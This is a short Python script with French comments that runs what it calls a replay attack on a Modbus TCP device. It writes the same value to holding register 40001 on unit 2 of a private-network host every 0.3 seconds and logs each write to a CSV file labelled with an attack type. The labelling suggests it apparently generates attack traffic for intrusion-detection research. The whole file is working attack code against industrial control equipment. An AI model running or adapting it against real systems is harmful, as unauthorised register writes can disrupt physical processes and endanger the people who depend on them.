from pymodbus.client import ModbusTcpClient
import time
import csv
from datetime import datetime

target_ip = '192.168.37.137'
csv_file = 'replay_traffic.csv'

with open(csv_file, mode='w', newline='') as f:
    writer = csv.writer(f)
    writer.writerow(['timestamp', 'function_code', 'address', 'device_id', 'value', 'status', 'attack_type'])

print("Démarrage de l'attaque Replay...")
print("Ctrl+C pour arrêter.\n")

# Le "message légitime" qu'on va rejouer en boucle
FIXED_VALUE = 500  # Valeur "normale" qu'on rejoue (simule une commande légitime capturée)

count = 0
try:
    while True:
        client = ModbusTcpClient(target_ip, port=502)
        client.connect()

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Rejeu du MÊME message (même valeur) de façon répétée et rapide
        result = client.write_register(address=40001, value=FIXED_VALUE, device_id=2)

        status = 'error' if result.isError() else 'success'

        with open(csv_file, mode='a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([timestamp, 6, 40001, 2, FIXED_VALUE, status, 'replay'])

        count += 1
        print(f"[{count}] {timestamp} - Replay value={FIXED_VALUE} - Status: {status}")

        client.close()
        time.sleep(0.3)  # Répétition rapide et anormale du même message

except KeyboardInterrupt:
    print(f"\nAttaque Replay arrêtée. {count} requêtes enregistrées dans '{csv_file}'.")
